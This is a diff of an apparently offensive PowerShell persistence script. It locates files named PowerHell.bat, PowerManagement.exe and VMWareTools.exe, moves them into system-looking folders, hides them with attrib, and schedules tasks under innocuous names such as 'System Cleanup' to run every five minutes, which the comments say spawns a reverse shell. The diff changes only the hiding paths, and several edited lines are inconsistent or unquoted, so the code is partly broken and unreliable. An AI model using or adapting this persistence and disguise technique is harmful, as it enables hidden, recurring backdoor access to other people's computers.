@@ -25,22 +25,22 @@ $file = 'PowerHell.bat'
 $searchinfolder = 'C:\'
 $powerhellLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move PowerHell.bat
-move $powerhellLoc C:\Windows\System32
+move $powerhellLoc "C:\Program Files (x86)\Microsoft.NET"
 # Hide the file from windows explorer using attrib
-attrib +h C:\Windows\System32\PowerHell.bat
+attrib +h C:\Program Files (x86)\Microsoft.NET\PowerHell.bat
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "start /B C:\Windows\System32\PowerHell.bat"
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "start /B C:\Program Files (x86)\Microsoft.NET\PowerHell.bat"
 
 # Find PowerManagement.exe
 $file = 'PowerManagement.exe'
 $searchinfolder = 'C:\'
 $powermanLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move PowerManagement.exe
-move $powermanLoc C:\Program Files\MSBuild\Microsoft
+move $powermanLoc C:\sources\en-US
 # Hide the file from windows explorer using attrib
-attrib +h  C:\Program Files\MSBuild\Microsoft\PowerManagement.exe
+attrib +h  C:\sources\en-US\PowerManagement.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "start /B C:\Program Files\MSBuild\Microsoft\PowerManagement.exe"
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "start /B C:\sources\en-US\PowerManagement.exe"
 
 # Find VMWareTools.exe
 $file = 'VMWareTools.exe'
@@ -49,9 +49,9 @@ $vmwaretoolsLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %
 # Move VMWareTools.exe
 move $vmwaretoolsLoc C:\Users\Public
 # Hide VMWareTools.exe
-attrib +h C:\Users\Public\VMWareTools.exe
+attrib +h C:\PerfLogs\VMWareTools.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "start /B C:\Users\Public\VMWareTools.exe"
+schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "start /B C:\PerfLogs\VMWaretools.exe"
 
 # Find DiskHelper.exe
 $file = 'DiskHelper.exe'
